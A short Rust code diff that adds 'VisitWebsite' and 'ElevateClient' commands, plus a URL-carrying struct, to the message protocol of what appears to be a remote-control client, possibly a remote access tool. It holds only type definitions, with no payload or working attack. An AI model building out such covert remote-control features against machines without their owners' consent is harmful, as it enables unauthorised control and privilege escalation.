@@ -36,6 +36,10 @@ pub enum Command {
     DisksResult(Vec<String>),
     FileList(Vec<File>),
     CurrentFolder(String),
+
+    VisitWebsite(VisitWebsiteData),
+
+    ElevateClient,
 }
 
 #[derive(Serialize, Deserialize, Debug)]
@@ -82,4 +86,10 @@ pub struct EncryptionRequestData {
 #[derive(Serialize, Deserialize, Debug)]
 pub struct EncryptionResponseData {
     pub secret: Vec<u8>,
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+pub struct VisitWebsiteData {
+    pub visit_type: String,
+    pub url: String,
 }
